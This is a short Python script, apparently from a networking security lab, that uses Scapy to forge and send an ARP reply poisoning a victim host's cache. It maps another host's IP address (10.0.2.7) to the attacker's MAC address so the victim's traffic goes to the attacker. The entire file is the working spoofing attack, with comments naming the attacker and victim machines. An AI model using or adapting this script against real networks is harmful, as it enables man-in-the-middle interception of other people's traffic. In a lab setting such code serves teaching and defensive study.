#!/usr/bin/python3
from scapy.all import *

E = Ether(src='08:00:27:28:a6:34', dst='08:00:27:8a:db:e6') #src is Attack MAC address, dst is computer A MAC address.
A = ARP(op=2, hwdst='08:00:27:8a:db:e6', pdst='10.0.2.15', hwsrc='08:00:27:28:a6:34', psrc='10.0.2.7') #pdst is computer A IP address, psrc is computer B IP address
pkt = E/A
sendp(pkt)
